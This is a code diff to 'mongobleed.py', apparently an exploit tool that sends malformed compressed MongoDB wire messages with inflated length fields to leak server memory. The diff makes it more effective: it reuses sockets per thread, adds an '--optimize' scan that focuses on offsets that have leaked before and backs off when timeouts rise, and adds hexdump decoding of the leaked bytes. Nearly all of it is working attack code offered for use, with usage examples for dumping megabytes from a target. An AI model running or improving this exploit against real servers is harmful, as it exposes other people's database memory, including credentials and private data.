@@ -19,11 +19,15 @@ import os
 import re
 import socket
 import struct
+import threading
 import time
 import warnings
 import zlib
+import random
+from collections import deque
 
 from rich.console import Console
+from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
 from urllib.parse import unquote_to_bytes
 
 FIELD_NAME_RE = re.compile(rb"field name '([^']*)'")
@@ -33,23 +37,22 @@ UNICODE_ESC_RE = re.compile(r"\\u[0-9A-Fa-f]{4}|\\x[0-9A-Fa-f]{2}|\\[nrt\"\\\\]"
 ESCAPE_SEQ_RE = re.compile(r"(\\u[0-9A-Fa-f]{4}|\\x[0-9A-Fa-f]{2}|\\[nrt\"\\\\])")
 BASE64_RE = re.compile(r"^[A-Za-z0-9+/]+={0,2}$")
 SIZE_RE = re.compile(r"^\s*(\d+)\s*(kb|mb)?\s*$", re.IGNORECASE)
+_TLS = threading.local()
 
-def send_probe(host, port, doc_len, buffer_size, timeout):
-    """Send crafted BSON with inflated document length"""
-    # Minimal BSON content - we lie about total length
+def _build_payload(doc_len, buffer_size):
     content = b'\x10a\x00\x01\x00\x00\x00'  # int32 a=1
     bson = struct.pack('<i', doc_len) + content
-    
-    # Wrap in OP_MSG
     op_msg = struct.pack('<I', 0) + b'\x00' + bson
     compressed = zlib.compress(op_msg)
-    
-    # OP_COMPRESSED with inflated buffer size (triggers the bug)
     payload = struct.pack('<I', 2013)  # original opcode
     payload += struct.pack('<i', buffer_size)  # claimed uncompressed size
     payload += struct.pack('B', 2)  # zlib
     payload += compressed
-    
+    return payload
+
+def send_probe(host, port, doc_len, buffer_size, timeout):
+    """Send crafted BSON with inflated document length"""
+    payload = _build_payload(doc_len, buffer_size)
     header = struct.pack('<IIII', 16 + len(payload), 1, 0, 2012)
     
     try:
@@ -71,20 +74,7 @@ def send_probe(host, port, doc_len, buffer_size, timeout):
 
 def send_probe_with_status(host, port, doc_len, buffer_size, timeout):
     """Send probe and return (response, ok) for auto-tuning diagnostics."""
-    # Minimal BSON content - we lie about total length
-    content = b'\x10a\x00\x01\x00\x00\x00'  # int32 a=1
-    bson = struct.pack('<i', doc_len) + content
-    
-    # Wrap in OP_MSG
-    op_msg = struct.pack('<I', 0) + b'\x00' + bson
-    compressed = zlib.compress(op_msg)
-    
-    # OP_COMPRESSED with inflated buffer size (triggers the bug)
-    payload = struct.pack('<I', 2013)  # original opcode
-    payload += struct.pack('<i', buffer_size)  # claimed uncompressed size
-    payload += struct.pack('B', 2)  # zlib
-    payload += compressed
-    
+    payload = _build_payload(doc_len, buffer_size)
     header = struct.pack('<IIII', 16 + len(payload), 1, 0, 2012)
     
     try:
@@ -103,6 +93,55 @@ def send_probe_with_status(host, port, doc_len, buffer_size, timeout):
         return response, len(response) > 0
     except:
         return b'', False
+
+def _get_thread_socket(host, port, timeout):
+    sock = getattr(_TLS, "sock", None)
+    if sock is None or getattr(_TLS, "host", None) != host or getattr(_TLS, "port", None) != port:
+        if sock:
+            try:
+                sock.close()
+            except:
+                pass
+        sock = socket.socket()
+        sock.settimeout(timeout)
+        sock.connect((host, port))
+        _TLS.sock = sock
+        _TLS.host = host
+        _TLS.port = port
+        _TLS.request_id = 1
+        _TLS.timeout = timeout
+        return sock
+    if getattr(_TLS, "timeout", None) != timeout:
+        sock.settimeout(timeout)
+        _TLS.timeout = timeout
+    return sock
+
+def send_probe_reuse(host, port, doc_len, buffer_size, timeout):
+    """Send probe reusing a thread-local socket."""
+    payload = _build_payload(doc_len, buffer_size)
+    for _ in range(2):
+        try:
+            sock = _get_thread_socket(host, port, timeout)
+            request_id = _TLS.request_id
+            _TLS.request_id += 1
+            header = struct.pack('<IIII', 16 + len(payload), request_id, 0, 2012)
+            sock.sendall(header + payload)
+            response = b''
+            while len(response) < 4 or len(response) < struct.unpack('<I', response[:4])[0]:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                response += chunk
+            return response, len(response) > 0
+        except:
+            sock = getattr(_TLS, "sock", None)
+            if sock:
+                try:
+                    sock.close()
+                except:
+                    pass
+            _TLS.sock = None
+    return b'', False
 
 def extract_leaks(response):
     """Extract leaked data from error response"""
@@ -145,6 +184,7 @@ def main():
         "  python3 mongobleed.py --host <target> --auto --auto-samples 12\n"
         "  python3 mongobleed.py --host <target> --auto --auto-mode size\n"
         "  python3 mongobleed.py --host <target> --auto --auto-legacy\n"
+        "  python3 mongobleed.py --host <target> --optimize --loop --decode\n"
         "  python3 mongobleed.py --host <target> --dump 10MB\n"
         "  python3 mongobleed.py --host <target> --dump 10MB --dump-window 2048\n"
         "  python3 mongobleed.py --host <target> --dump 512KB --preview-bytes 4096 --decode\n"
@@ -176,6 +216,7 @@ def main():
     parser.add_argument('--max-empty-passes', type=int, default=1, help='Stop after N passes with no new leaks')
     parser.add_argument('--loop', action='store_true', help='Keep looping until stopped')
     parser.add_argument('--decode', action='store_true', help='Try to decode URL, unicode escapes, and base64')
+    parser.add_argument('--hex', action='store_true', help='Force hexdump preview output')
     parser.add_argument('--dump', help='Target claimed size, e.g. 10MB or 512KB')
     parser.add_argument('--dump-window', type=int, default=0, help='Probe +/- N bytes around dump size (0=auto)')
     parser.add_argument('--auto', action='store_true', help='Auto-tune dump size/window for best yield')
@@ -188,6 +229,8 @@ def main():
                         help='Max per-probe timeout in auto mode (seconds)')
     parser.add_argument('--auto-mode', choices=['speed', 'size'], default='speed',
                         help='Auto-tune objective: speed (bytes/sec) or size (max bytes)')
+    parser.add_argument('--optimize', action='store_true',
+                        help='Smarter scan strategy with sampling, hot offsets, and backoff')
     parser.add_argument('--output', default=None, help='Output file (default: auto-generated)')
     args = parser.parse_args()
 
@@ -210,6 +253,19 @@ def main():
             else:
                 out.append(f"\\x{b:02x}")
         return "".join(out)
+
+    def hexdump_preview(data, limit, width=16, max_lines=8):
+        view = data[:limit]
+        lines = []
+        for i in range(0, len(view), width):
+            if len(lines) >= max_lines:
+                lines.append("...")
+                break
+            chunk = view[i:i + width]
+            hex_part = " ".join(f"{b:02x}" for b in chunk)
+            ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
+            lines.append(f"{i:08x}  {hex_part:<47}  |{ascii_part}|")
+        return "\n".join(lines)
 
     def truncate_text(text, limit):
         if len(text) <= limit:
@@ -644,49 +700,156 @@ def main():
         all_leaked = b""
     out_fh = open(args.output, 'ab')
     
+    probe_reuse = args.optimize
+
     def worker(doc_len):
-        response = send_probe(
-            args.host,
-            args.port,
-            doc_len,
-            doc_len + args.buffer_extra,
-            args.timeout,
-        )
-        return doc_len, extract_leaks(response)
+        if probe_reuse:
+            response, ok = send_probe_reuse(
+                args.host,
+                args.port,
+                doc_len,
+                doc_len + args.buffer_extra,
+                args.timeout,
+            )
+        else:
+            response = send_probe(
+                args.host,
+                args.port,
+                doc_len,
+                doc_len + args.buffer_extra,
+                args.timeout,
+            )
+            ok = True
+        return doc_len, extract_leaks(response), ok
 
     empty_passes = 0
     pass_num = 0
+    optimize_context = None
+    if args.optimize:
+        range_size = max(0, args.max_offset - args.min_offset)
+        chunk_size = min(4096, max(256, range_size // 256 or 256))
+        chunk_starts = list(range(args.min_offset, args.max_offset, chunk_size))
+        optimize_context = {
+            "chunk_size": chunk_size,
+            "chunk_stats": {start: {"hits": 0, "scans": 0} for start in chunk_starts},
+            "hot_offsets": deque(maxlen=2048),
+            "sample_step": 64,
+            "sample_budget": min(10000, max(2048, range_size // 100 or 2048)),
+            "dense_budget": min(range_size, 8192),
+            "dense_chunks": 5,
+            "empty_streak": 0,
+        }
+
+    def build_optimize_offsets(pass_index, opt_ctx):
+        offsets = []
+        seen = set()
+        for off in list(opt_ctx["hot_offsets"]):
+            if args.min_offset <= off < args.max_offset and off not in seen:
+                seen.add(off)
+                offsets.append(off)
+
+        range_size = max(1, args.max_offset - args.min_offset)
+        step = max(opt_ctx["sample_step"], max(1, range_size // opt_ctx["sample_budget"]))
+        start = args.min_offset + (pass_index % step)
+        for off in range(start, args.max_offset, step):
+            if off not in seen:
+                seen.add(off)
+                offsets.append(off)
+
+        def chunk_score(item):
+            stats = item[1]
+            if stats["scans"] == 0:
+                return 0.0
+            return stats["hits"] / stats["scans"]
+
+        dense_count = 0
+        scored = sorted(opt_ctx["chunk_stats"].items(), key=chunk_score, reverse=True)
+        for chunk_start, _ in scored[:opt_ctx["dense_chunks"]]:
+            for off in range(chunk_start, min(chunk_start + opt_ctx["chunk_size"], args.max_offset)):
+                if off not in seen:
+                    seen.add(off)
+                    offsets.append(off)
+                    dense_count += 1
+                    if dense_count >= opt_ctx["dense_budget"]:
+                        break
+            if dense_count >= opt_ctx["dense_budget"]:
+                break
+        return offsets
+
     interrupted = False
     try:
         while True:
             pass_num += 1
             new_in_pass = 0
-            with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
-                futures = [executor.submit(worker, doc_len) for doc_len in range(args.min_offset, args.max_offset)]
-                for future in concurrent.futures.as_completed(futures):
-                    doc_len, leaks = future.result()
-                    for data in leaks:
-                        if data not in unique_leaks and data not in all_leaked:
-                            unique_leaks.add(data)
-                            unique_fragments.append(data)
-                            out_fh.write(data)
-                            all_leaked += data
-                            new_in_pass += 1
+            if optimize_context is not None:
+                offsets = build_optimize_offsets(pass_num, optimize_context)
+            else:
+                offsets = list(range(args.min_offset, args.max_offset))
+            total_offsets = len(offsets)
+            with Progress(
+                SpinnerColumn(),
+                TextColumn(f"[bold cyan]Scanning offsets[/bold cyan] (workers={args.workers})"),
+                BarColumn(),
+                TextColumn("{task.completed}/{task.total}"),
+                TextColumn("last={task.fields[last]:>7}"),
+                TextColumn("rate={task.fields[rate]:>8}"),
+                TimeElapsedColumn(),
+                TimeRemainingColumn(),
+                console=console,
+            ) as progress:
+                task_id = progress.add_task("scan", total=total_offsets, last="-", rate="-")
+                with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
+                    futures = [executor.submit(worker, doc_len) for doc_len in offsets]
+                    ok_count = 0
+                    timeout_count = 0
+                    for future in concurrent.futures.as_completed(futures):
+                        doc_len, leaks, ok = future.result()
+                        progress.update(task_id, advance=1, last=str(doc_len))
+                        if progress.tasks[0].elapsed:
+                            rate = progress.tasks[0].completed / progress.tasks[0].elapsed
+                            progress.update(task_id, rate=f"{rate:7.1f}/s")
+                        if ok:
+                            ok_count += 1
+                        else:
+                            timeout_count += 1
+                        if optimize_context is not None:
+                            chunk_size = optimize_context["chunk_size"]
+                            chunk_start = args.min_offset + ((doc_len - args.min_offset) // chunk_size) * chunk_size
+                            stats = optimize_context["chunk_stats"].get(chunk_start)
+                            if stats is not None:
+                                stats["scans"] += 1
+                                if leaks:
+                                    stats["hits"] += 1
+                            if leaks:
+                                optimize_context["hot_offsets"].append(doc_len)
+                        for data in leaks:
+                            if data not in unique_leaks and data not in all_leaked:
+                                unique_leaks.add(data)
+                                unique_fragments.append(data)
+                                out_fh.write(data)
+                                all_leaked += data
+                                new_in_pass += 1
 
-                            # Show interesting leaks (> 10 bytes)
-                            if len(data) > 10:
-                                preview = ascii_preview(data, args.preview_bytes)
-                                if args.decode:
-                                    variants = decode_variants(data, args.preview_bytes * 2)
-                                    if variants:
-                                        preview = " | ".join(variants)
+                                # Show interesting leaks (> 10 bytes)
+                                if len(data) > 10:
+                                    preview = ascii_preview(data, args.preview_bytes)
+                                    if args.decode:
+                                        variants = decode_variants(data, args.preview_bytes * 2)
+                                        if variants:
+                                            preview = " | ".join(variants)
+                                        else:
+                                            cleaned = decode_from_preview(preview, args.preview_bytes * 2)
+                                            if cleaned:
+                                                preview = cleaned
+                                    if (args.decode and not is_mostly_printable(preview)) or args.hex:
+                                        hexdump = hexdump_preview(data, args.preview_bytes)
+                                        console.print(
+                                            f"[green][+][/green] offset={doc_len:4d} len={len(data):4d}:\n{hexdump}"
+                                        )
                                     else:
-                                        cleaned = decode_from_preview(preview, args.preview_bytes * 2)
-                                        if cleaned:
-                                            preview = cleaned
-                                console.print(f"[green][+][/green] offset={doc_len:4d} len={len(data):4d}: {preview}")
+                                        console.print(f"[green][+][/green] offset={doc_len:4d} len={len(data):4d}: {preview}")
             if args.loop:
-                if auto_context is not None:
+                if auto_context is not None and not args.optimize:
                     if new_in_pass == 0:
                         auto_context["empty_streak"] += 1
                     else:
@@ -711,6 +874,32 @@ def main():
                                 f"Auto-expand window to +/- {next_window} "
                                 f"(range {args.min_offset}-{args.max_offset})"
                             )
+                if optimize_context is not None:
+                    if new_in_pass == 0:
+                        optimize_context["empty_streak"] += 1
+                    else:
+                        optimize_context["empty_streak"] = 0
+                    if optimize_context["empty_streak"] >= 5:
+                        optimize_context["sample_step"] = max(1, optimize_context["sample_step"] // 2)
+                        optimize_context["dense_budget"] = min(
+                            optimize_context["dense_budget"] * 2,
+                            optimize_context["chunk_size"] * 10,
+                        )
+                        optimize_context["empty_streak"] = 0
+                        console.print(
+                            "[bold yellow][!][/bold yellow] "
+                            f"Optimize densify: step={optimize_context['sample_step']} "
+                            f"dense_budget={optimize_context['dense_budget']}"
+                        )
+                    if total_offsets > 0:
+                        timeout_rate = timeout_count / total_offsets
+                        if timeout_rate > 0.3:
+                            sleep_time = min(1.0, timeout_rate) * random.uniform(0.1, 0.5)
+                            console.print(
+                                "[bold yellow][!][/bold yellow] "
+                                f"High timeout rate ({timeout_rate:.0%}), backing off {sleep_time:.2f}s"
+                            )
+                            time.sleep(sleep_time)
                 console.print(f"[bold cyan][*][/bold cyan] Pass {pass_num} complete, new fragments: {new_in_pass}")
                 continue
 
